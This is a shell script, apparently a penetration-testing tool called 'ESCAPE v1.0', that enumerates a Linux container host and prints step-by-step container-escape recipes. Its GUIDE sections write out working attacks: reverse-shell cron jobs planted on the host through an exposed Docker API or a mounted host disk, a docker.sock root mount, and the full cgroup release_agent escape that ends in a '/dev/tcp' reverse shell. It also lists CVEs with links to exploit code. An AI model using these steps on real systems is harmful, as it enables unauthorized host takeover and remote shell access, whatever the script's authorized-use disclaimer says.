#!/bin/sh
VERSION="v1.0.0 - Escape Script"
ADVISORY="This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission."


################### Color ###################
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
Y="${C}[1;33m"
B="${C}[1;34m"
LG="${C}[1;37m" #LightGray
DG="${C}[1;90m" #DarkGray
NC="${C}[0m"
UNDERLINED="${C}[5m"
ITALIC="${C}[3m"


################### Banner ###################
bash -c "printf '
————————————————————————————————————————————————————————————————————————————

      /////////    ///////    ///////    /////       ////////   /////////  
     ///         ///        ///        ///  ///     ///   ///  ///
    ////////      ////     ///        ///   ///    ///   ///  ////////
   ///              ////  ///        //////////   ////////   ///
  //////////  ////////    ////////  ///     ///  ///        //////////

————————————————————————————————————————————————————————————————————————————
                                                ESCAPE v1.0  by ZKAFKA
————————————————————————————————————————————————————————————————————————————
'";



################### Basic Check ###################
echo ""
printf $B"════════════════════════════╣ "$GREEN"Basic information"$B" ╠════════════════════════════\n"$NC
echo ""

printf $Y"[+] "$GREEN"OS: "$NC
(cat /proc/version || uname -a ) 2>/dev/null 
echo ""

printf $Y"[+] "$GREEN"Current User: "$NC;
USER="$(whoami)"
if [ "$(/usr/bin/id -u)" -eq "0" ];then
  printf "%s  ( You are Root already. ) \n" $USER 
else
  printf "%s  ($Y You are NOT a Root. It might be diffcult to Escape from virtualization, better to Escalate privilege first.$NC ) \n" $USER 
fi
echo ""

printf $Y"[+] "$GREEN"User & Groups: \n"$NC
(id || (whoami && groups)) 2>/dev/null 
echo ""

printf $Y"[+] "$GREEN"Hostname, hosts and DNS:\n"$NC
cat /etc/hostname /etc/hosts /etc/resolv.conf 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null
dnsdomainname 2>/dev/null || echo_not_found "dnsdomainname" 
echo ""

printf $Y"[+] "$GREEN"Networks and neighbours:\n"$NC
(route || ip n || cat /proc/net/route) 2>/dev/null
(arp -e || arp -a || cat /proc/net/arp) 2>/dev/null
echo ""

printf $Y"[+] "$GREEN"System stats:\n"$NC
(df -h || lsblk) 2>/dev/null || echo_not_found "df and lsblk"
free 2>/dev/null || echo_not_found "free"
echo ""

printf $Y"[+] "$GREEN"CPU info:\n"$NC
lscpu 2>/dev/null || echo_not_found "lscpu"
echo ""

################### Virtualization Check ###################
echo ""
printf $B"═══════════════════════════╣ "$GREEN"Virtualization Check"$B" ╠═══════════════════════════\n"$NC
echo ""

#Running in a virtual environment
printf $Y"[+] "$GREEN"Is this a virtual machine? ..... "$NC
hypervisorflag=`cat /proc/cpuinfo 2>/dev/null | grep flags | grep hypervisor`
if [ `command -v systemd-detect-virt 2>/dev/null` ]; then
  detectedvirt=`systemd-detect-virt`
  if [ "$hypervisorflag" ]; then printf $RED"Yes ("$detectedvirt")"$NC; else printf $GREEN"No"$NC; fi
else
  if [ "$hypervisorflag" ]; then printf $RED"Yes"$NC; else printf $GREEN"No"$NC; fi
fi
echo ""

#Container
printf $Y"[+] "$GREEN"Is this a container? ........... "$NC
dockercontainer=`grep -i docker /proc/self/cgroup  2>/dev/null; grep -i kubepods /proc/self/cgroup  2>/dev/null; find / -maxdepth 3 -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`
lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`
if [ "$dockercontainer" ]; then echo $RED"Docker container\n"$NC
echo $LG"Evidence:"$NC
echo $dockercontainer ;
elif [ "$lxccontainer" ]; then echo $RED"LXC container\n"$NC
echo $LG"Evidence:"$NC
echo $lxccontainer;
else echo "No"
fi

################### Virtualization Escape ###################
echo ""
printf $B"══════════════════════════════╣ "$GREEN"Escape Vector"$B" ╠══════════════════════════════\n"$NC
echo ""

# check file mount
printf $Y"[+] "$GREEN"Check Mount floder\n"$NC
df
printf $B"[!] GUIDE:\n"$NC
printf $Y"Dangerous mount file: \n"$NC
printf $Y"/, /proc/sys/kernel/core_pattern, /var/run/docker.sock ... \n"$NC
echo ""

# check docker swarm deamon
printf $Y"[+] "$GREEN"Check TCP Port 2375\n"$NC
if [ "`lsof -i:2375 2>/dev/null`" ]; then
  lsof -i:2375 2>/dev/null
  echo ""
  printf $RED"Port 2375 is open\n"$NC;
else
  printf "Port 2375 is closed (or you are not root)\n";
fi
printf $B"[!] GUIDE:\n"$NC
printf $Y"If Port 2375 is Open, you can use Docker swarm daemon api to ESCAPE\n"$NC
printf $Y"1. Browse http://[LOCAL_IP]:2375/version, if get response, prove it having Vulnerablility\n"$NC
printf $Y"2. ESCAPE POC:\n"
printf $Y"   import docker\n"
printf $Y"   client = docker.DockerClient(base_url='http://[LOCAL_IP]:2375')\n"
printf $Y"   data = client.containers.run('alpine:latest', r'''sh -c \"echo '* * * * * /usr/bin/nc [LOCAL_IP] 1234 -e /bin/sh' >> /tmp/etc/crontabs/root\" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})\n"$NC
echo ""
  
# check docker.sock file
printf $Y"[+] "$GREEN"Check .sock files\n"$NC
if [ -w "/var/run/docker.sock" ]; then
  echo $RED"Docker socket /var/run/docker.sock is writable"$NC
else
  echo "Docker socket /var/run/docker.sock is not writable"
fi
if [ -w "/run/docker.sock" ]; then
  echo $RED"Docker socket /run/docker.sock is writable"$NC
else
  echo "Docker socket /run/docker.sock is not writable"
fi
printf $B"[!] GUIDE:\n"$NC
printf $Y"If docker.sock is writable, you can create a new Docker to commuicate with HOST by this socket\n"$NC
printf $Y"1. Create a docker and mount root directory: 'docker run -it -v /:/host ubuntu:latest /bin/bash' \n"$NC
printf $Y"2. In docker: 'chroot /host' \n"$NC
printf $Y"3. new docker -exit-> CURRENT -exit-> TARGET HOST \n"$NC
echo ""

# check privilege
printf $Y"[+] "$GREEN"Check privilege\n"$NC
cat /proc/self/status |grep Cap
if [ "`cat /proc/self/status | grep CapEff | grep fffffffff 2>/dev/null`" ]; then
  printf $RED"Container run in privileged mode!\n"$NC
else printf "Container is not running in privileged mode\n"
fi
printf $B"[!] GUIDE:\n"$NC
printf $Y"If CapEff's value is as 000000xffffffffff format, Proves the container is in privileged mode\n"$NC
printf $Y"1. Use 'fdisk -l' to find which is the HOST disk\n"$NC
printf $Y"2. mkdir /test \n"$NC
printf $Y"3. mount /dev/[HOST_disk] /test \n"$NC
printf $Y"4. chroot /test \n"$NC
printf $Y"5. Write reverse shell:\n"$NC
printf $Y"   echo '* * * * * /bin/bash -i >& /dev/tcp/[LOCAL_IP]/1234 0>&1' >> /test/var/spool/cron/crontabs/root \n"$NC
echo ""

# check SYS_ADMIN & CGroup
printf $Y"[+] "$GREEN"Check SYS_ADMIN & CGroup\n"$NC
mkdir /tmp/test && mount /test /tmp/test 2>/tmp/test/e.txt
if [ "`cat /tmp/test/e.txt|grep permission 2>/dev/null`" ]; then
  printf "Container is not running in SYS_ADMIN\n"
  rm -rf /tmp/test
else 
  printf $RED"Container probably run in SYS_ADMIN!\n"$NC
  rm -rf /tmp/test
fi
printf $B"[!] GUIDE:\n"$NC
printf $Y"You can try to mount HOST cgroup, use cgroup 'notify_on_release' to execute shell (AppArmor should be closed, CentOS and RedHat type system is default not installed.)\n"$NC
printf $Y"#  Mount host cgroup, self-define a new cgroup\n"$NC
printf $Y"1. mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x\n"$NC
printf $Y"#  Config this cgroup's 'notify_no_release' and 'release_agent'\n"$NC
printf $Y"2. echo 1 > /tmp/cgrp/x/notify_on_release\n"$NC
printf $Y"3. host_path=\`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab\`\n"$NC
printf $Y"4. echo \"$host_path/cmd\" > /tmp/cgrp/release_agent\n"$NC
printf $Y"5. echo '#!/bin/sh' > /cmd\n"$NC
printf $Y"6. echo \"sh -i >& /dev/tcp/10.0.0.1/8443 0>&1\" >> /cmd\n"$NC
printf $Y"7. chmod a+x /cmd\n"$NC
printf $Y"#  Trigger release_agent's executing\n"$NC
printf $Y"8. sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"\n"$NC
echo ""

################### CVE Check ###################
echo ""
printf $B"══════════════════════════════╣ "$GREEN"CVE Exploit"$B" ╠══════════════════════════════\n"$NC
echo ""

# runC exploit
printf $Y"[+] "$GREEN"runC Exploit(CVE-2019-5736)\n"$NC
printf $Y"Docker<18.09.2, runc<1.0-rc6 \n"$NC
printf $B"[i] https://github.com/Frichetten/CVE-2019-5736-PoC \n"$NC
echo ""

# cp command exploit
printf $Y"[+] "$GREEN"cp command exploit(CVE-2019-14271)\n"$NC
printf $Y"Docker19.03.0 \n"$NC
printf $B"[i] https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/ \n"$NC
echo ""

# Containered exploit
printf $Y"[+] "$GREEN"Containered exploit(CVE-2020-15257)\n"$NC
printf $Y"containerd < 1.4.3/1.3.9 \n"$NC
if [ "`cat /proc/net/unix|grep -a 'containerd-shim' 2>/dev/null`" ]; then
  printf $RED"CVE-2020-15257 might exists!\n"$NC
fi
printf $B"[i] https://github.com/ZKAFKA/POCollection/blob/main/CVE-2020-15257.md \n"$NC
echo ""

# DirtyCow exploit
printf $Y"[+] "$GREEN"DirtyCow exploit(CVE-2016-5195)\n"$NC
printf $Y"Centos7 /RHEL7  <  3.10.0-327.36.3.el7
Cetnos6/RHEL6   <  2.6.32-642.6.2.el6
Ubuntu 16.10    <  4.8.0-26.28
Ubuntu 16.04    <  4.4.0-45.66
Ubuntu 14.04    <  3.13.0-100.147
Debian 8        <  3.16.36-1+deb8u2
Debian 7        <  3.2.82-1\n"$NC
printf $B"[i] https://github.com/scumjr/dirtycow-vdso.git \n"$NC
echo ""
